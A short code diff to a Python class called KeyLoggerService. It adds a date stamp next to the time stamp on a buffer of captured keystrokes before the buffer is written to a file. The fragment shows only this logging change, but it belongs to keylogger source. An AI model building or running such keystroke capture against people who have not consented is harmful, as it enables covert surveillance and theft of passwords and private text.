@@ -46,7 +46,9 @@ class KeyLoggerService:
                 if buffer:
                     self.clean_buffer()
                     time_ = datetime.now().strftime('%H:%M:%S')
+                    time_day_ = datetime.now().strftime('%Y-%m-%d')
                     buffer.append(time_)
+                    buffer.append(time_day_)
                     FileWriter(buffer)
 
     def stop_listener(self):
